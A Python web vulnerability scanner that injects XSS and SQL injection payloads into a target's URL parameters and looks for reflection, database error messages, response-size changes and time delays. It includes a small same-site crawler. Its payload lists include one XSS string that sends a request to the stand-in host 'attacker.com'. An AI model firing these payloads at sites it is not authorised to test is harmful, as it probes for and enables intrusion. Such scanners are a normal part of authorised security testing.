import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time
import re
from bs4 import BeautifulSoup

# SQL Error signatures
SQL_ERRORS = {
    'mysql': r"mysql_fetch|mysql_num|SQL syntax|SQL statement",
    'sqlite': r"sqlite|database disk image is malformed",
    'postgresql': r"PostgreSQL|SQLSTATE|pg_query",
    'mssql': r"MSSQL|SQL Server|Msg \d+",
    'oracle': r"ORA-\d+|Oracle|PL/SQL",
    'generic': r"Syntax error|Unterminated string|Unexpected end of file|SQL error",
}

XSS_PAYLOADS_SIMPLE = [
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><script>alert(1)</script>',
    '"\'>alert(1)</\'">',
    '<iframe src=javascript:alert(1)>',
    '<body onload=alert(1)>',
]

XSS_PAYLOADS_ADVANCED = [
    '<img src=x onerror="fetch(\'http://attacker.com?xss=1\')">',
    'jaVasCript:alert(1)',
    '<math><mtext><script>alert(1)</script></mtext></math>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<marquee onstart=alert(1)>',
    'data:text/html,<script>alert(1)</script>',
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
]

XSS_PAYLOADS_CONTEXT = [
    '"><img src=x onerror=alert(1)>',
    '\'><img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    '\'><svg onload=alert(1)>',
    ')<img src=x onerror=alert(1)>(',
    ';</img><img src=x onerror=alert(1)>',
]

SQLI_PAYLOADS_ERROR = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1 /*",
    "' OR 1=1 #",
    '" OR "1"="1',
    "' OR 'a'='a",
    "' OR sleep(5)--",
    "1' AND SLEEP(5)--",
]

SQLI_PAYLOADS_BLIND = [
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000, SHA1('test'))--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)--",
]

SQLI_PAYLOADS_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "' UNION SELECT database()--",
    "' UNION SELECT version()--",
]


def _get_response_text(url, timeout=8, allow_redirects=True):
    """Fetch URL and return (text, status_code, headers)."""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        r = requests.get(url, timeout=timeout, allow_redirects=allow_redirects, headers=headers)
        return r.text, r.status_code, r.headers
    except Exception as e:
        return '', None, {}


def _contains_sql_error(text):
    """Check if response contains SQL error signatures."""
    if not text:
        return None
    text_lower = text.lower()
    for db_type, pattern in SQL_ERRORS.items():
        if re.search(pattern, text_lower, re.IGNORECASE):
            return db_type
    return None


def _time_based_sqli_test(url, param, sleep_time=5):
    """Test for time-based blind SQL injection."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    
    if not qs or param not in qs:
        return False
    
    payload = f"' AND SLEEP({sleep_time})--"
    qcopy = qs.copy()
    qcopy[param] = [qcopy[param][0] + payload]
    new_q = urlencode(qcopy, doseq=True)
    test_url = urlunparse(parsed._replace(query=new_q))
    
    start = time.time()
    try:
        requests.get(test_url, timeout=sleep_time + 2)
    except requests.Timeout:
        pass
    except:
        pass
    elapsed = time.time() - start
    
    return elapsed >= sleep_time


def detect_xss(url, deep_scan=False):
    """Detect XSS vulnerabilities with multiple techniques."""
    findings = []
    baseline_text, _, _ = _get_response_text(url)
    
    if not baseline_text:
        return {'vulnerable': False, 'findings': [], 'error': 'Could not fetch URL'}
    
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    
    payloads = XSS_PAYLOADS_SIMPLE + XSS_PAYLOADS_CONTEXT
    if deep_scan:
        payloads += XSS_PAYLOADS_ADVANCED
    
    if qs:
        for param in qs:
            for payload in payloads:
                qcopy = qs.copy()
                qcopy[param] = [payload]
                new_q = urlencode(qcopy, doseq=True)
                candidate = urlunparse(parsed._replace(query=new_q))
                
                text, _, _ = _get_response_text(candidate)
                
                if payload in text:
                    context = text[max(0, text.find(payload)-50):text.find(payload)+100]
                    findings.append({
                        'param': param,
                        'payload': payload,
                        'url': candidate,
                        'evidence': 'reflected',
                        'context': context
                    })
                    break
    else:
        for payload in payloads:
            new_q = urlencode({'q': payload})
            candidate = urlunparse(parsed._replace(query=new_q))
            text, _, _ = _get_response_text(candidate)
            
            if payload in text:
                context = text[max(0, text.find(payload)-50):text.find(payload)+100]
                findings.append({
                    'param': 'q',
                    'payload': payload,
                    'url': candidate,
                    'evidence': 'reflected',
                    'context': context
                })
                break
    
    return {'vulnerable': bool(findings), 'findings': findings}


def detect_sqli(url, deep_scan=False, blind_detection=False):
    """Detect SQL Injection with error-based, blind, and union-based techniques."""
    findings = []
    baseline_text, baseline_status, _ = _get_response_text(url)
    
    if not baseline_text:
        return {'vulnerable': False, 'findings': [], 'error': 'Could not fetch URL'}
    
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    
    payloads = SQLI_PAYLOADS_ERROR
    if deep_scan:
        payloads += SQLI_PAYLOADS_UNION
    if blind_detection:
        payloads += SQLI_PAYLOADS_BLIND
    
    def check_text_different(a, b):
        if not a or not b:
            return False
        return abs(len(a) - len(b)) > 100
    
    if qs:
        for param in qs:
            for payload in payloads:
                qcopy = qs.copy()
                qcopy[param] = [qcopy[param][0] + payload]
                new_q = urlencode(qcopy, doseq=True)
                candidate = urlunparse(parsed._replace(query=new_q))
                
                text, status, _ = _get_response_text(candidate)
                
                db_type = _contains_sql_error(text)
                if db_type:
                    context = text[:300]
                    findings.append({
                        'param': param,
                        'payload': payload,
                        'url': candidate,
                        'evidence': f'sql_error_({db_type})',
                        'context': context[:200]
                    })
                elif check_text_different(baseline_text, text) and status == baseline_status:
                    findings.append({
                        'param': param,
                        'payload': payload,
                        'url': candidate,
                        'evidence': 'response_difference',
                        'context': f'Baseline: {len(baseline_text)} bytes, Test: {len(text)} bytes'
                    })
            
            if blind_detection and not findings:
                if _time_based_sqli_test(url, param, sleep_time=3):
                    findings.append({
                        'param': param,
                        'payload': "' AND SLEEP(3)--",
                        'url': url,
                        'evidence': 'time_based_blind',
                        'context': 'Response time delayed by >3 seconds'
                    })
    else:
        for payload in payloads:
            new_q = urlencode({'q': payload})
            candidate = urlunparse(parsed._replace(query=new_q))
            text, status, _ = _get_response_text(candidate)
            
            db_type = _contains_sql_error(text)
            if db_type:
                context = text[:300]
                findings.append({
                    'param': 'q',
                    'payload': payload,
                    'url': candidate,
                    'evidence': f'sql_error_({db_type})',
                    'context': context[:200]
                })
            elif check_text_different(baseline_text, text):
                findings.append({
                    'param': 'q',
                    'payload': payload,
                    'url': candidate,
                    'evidence': 'response_difference',
                    'context': f'Baseline: {len(baseline_text)} bytes, Test: {len(text)} bytes'
                })
    
    return {'vulnerable': bool(findings), 'findings': findings}


def crawl_and_test(url, max_pages=10):
    """Crawl the target site and extract all testable parameters."""
    visited = set()
    to_visit = [url]
    all_findings = {'xss': [], 'sqli': []}
    
    while to_visit and len(visited) < max_pages:
        current = to_visit.pop(0)
        if current in visited:
            continue
        visited.add(current)
        
        text, status, _ = _get_response_text(current, allow_redirects=False)
        if status != 200 or not text:
            continue
        
        try:
            soup = BeautifulSoup(text, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('http'):
                    parsed_href = urlparse(href)
                    parsed_url = urlparse(url)
                    if parsed_href.netloc == parsed_url.netloc and href not in visited:
                        to_visit.append(href)
        except:
            pass
    
    return visited

